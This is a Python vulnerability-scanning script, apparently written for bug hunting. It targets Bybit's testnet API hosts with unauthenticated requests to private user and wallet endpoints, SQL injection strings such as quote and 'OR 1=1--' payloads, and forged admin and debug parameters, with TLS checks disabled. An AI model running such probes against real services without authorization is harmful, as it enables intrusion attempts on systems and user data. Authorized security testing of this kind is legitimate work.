#!/usr/bin/env python3
"""
Target: Find REAL exploitable vulnerabilities
Focus on: IDOR, Auth Bypass, Stored XSS, SQL Injection
"""
import requests
import time
import json

requests.packages.urllib3.disable_warnings()

# API endpoints found in recon
api_base = "https://api-testnet.bybit.com"
api2_base = "https://api2-testnet.bybit.com"

print("="*80)
print("HUNTING FOR REAL EXPLOITABLE VULNERABILITIES")
print("="*80)

# Test 1: IDOR - Try accessing user data without auth or with manipulated UIDs
print("\n[1] TESTING IDOR ON USER ENDPOINTS")
print("-"*80)

idor_endpoints = [
    "/v5/user/query-api",
    "/v5/user/query-sub-members",
    "/v5/account/wallet-balance",
    "/v5/asset/transfer/query-account-coins-balance",
    "/v5/asset/transfer/query-transfer-coin-list",
    "/v2/private/user/profile",
]

for endpoint in idor_endpoints:
    url = api_base + endpoint
    try:
        # Try without auth
        r = requests.get(url, timeout=5, verify=False)
        print(f"\n{endpoint}")
        print(f"  Status: {r.status_code}")
        if r.status_code != 403:
            print(f"  Response: {r.text[:200]}")
            if "10003" not in r.text and "Invalid API key" not in r.text:
                print(f"  ⚠️  POTENTIAL IDOR - No proper auth check!")
    except Exception as e:
        print(f"  Error: {e}")

# Test 2: SQL/NoSQL Injection in public endpoints
print("\n\n[2] TESTING SQL/NOSQL INJECTION ON PUBLIC ENDPOINTS")
print("-"*80)

public_endpoints = [
    "/v5/market/tickers?category=spot&symbol=BTCUSDT'",
    "/v5/market/tickers?category=spot&symbol=BTCUSDT\" OR 1=1--",
    "/v5/market/orderbook?category=linear&symbol=BTCUSDT&limit=1'",
    "/v5/market/kline?category=linear&symbol=BTCUSDT&interval=1&start=1'&end=2",
]

for endpoint in public_endpoints:
    url = api_base + endpoint
    try:
        start_time = time.time()
        r = requests.get(url, timeout=10, verify=False)
        elapsed = time.time() - start_time
        
        print(f"\n{endpoint[:80]}...")
        print(f"  Status: {r.status_code}, Time: {elapsed:.2f}s")
        
        # Check for SQL error messages
        sql_errors = ['syntax error', 'mysql', 'postgresql', 'mongodb', 'exception', 'stack trace']
        response_lower = r.text.lower()
        
        for error in sql_errors:
            if error in response_lower:
                print(f"  🚨 SQL ERROR DETECTED: {error}")
                print(f"  Response: {r.text[:300]}")
                break
                
        # Check for time-based injection
        if elapsed > 5:
            print(f"  ⚠️  SLOW RESPONSE - possible time-based injection")
            
    except requests.Timeout:
        print(f"  ⏱️  TIMEOUT - possible injection causing delay")
    except Exception as e:
        print(f"  Error: {e}")

# Test 3: Check for parameter pollution / mass assignment
print("\n\n[3] TESTING PARAMETER POLLUTION")
print("-"*80)

pollution_tests = [
    "/v5/market/tickers?category=spot&symbol=BTCUSDT&admin=true",
    "/v5/market/tickers?category=spot&symbol=BTCUSDT&role=admin",
    "/v5/market/tickers?category=spot&symbol=BTCUSDT&isAdmin=1",
    "/v5/market/tickers?category=spot&symbol=BTCUSDT&debug=true",
]

for endpoint in pollution_tests:
    url = api_base + endpoint
    try:
        r = requests.get(url, timeout=5, verify=False)
        if 'debug' in r.text.lower() or 'admin' in r.text.lower():
            print(f"\n⚠️  {endpoint}")
            print(f"  Response contains debug/admin info: {r.text[:200]}")
    except:
        pass

# Test 4: Check API2 endpoints (might have different security)
print("\n\n[4] TESTING API2 ENDPOINTS (DIFFERENT BACKEND)")
print("-"*80)

api2_tests = [
    "/v2/public/metrics",
    "/v2/private/user/profile",
    "/api/v1/user",
    "/api/v1/account",
]

for endpoint in api2_tests:
    url = api2_base + endpoint
    try:
        r = requests.get(url, timeout=5, verify=False)
        print(f"\n{endpoint}")
        print(f"  Status: {r.status_code}")
        if r.status_code == 200:
            print(f"  ✓ Accessible! Response: {r.text[:200]}")
        elif r.status_code == 500:
            print(f"  ⚠️  500 Error - might be vulnerable to injection")
            print(f"  Response: {r.text[:300]}")
    except Exception as e:
        print(f"  Error: {e}")

print("\n" + "="*80)
print("SCAN COMPLETE - Review results above for potential vulnerabilities")
print("="*80)
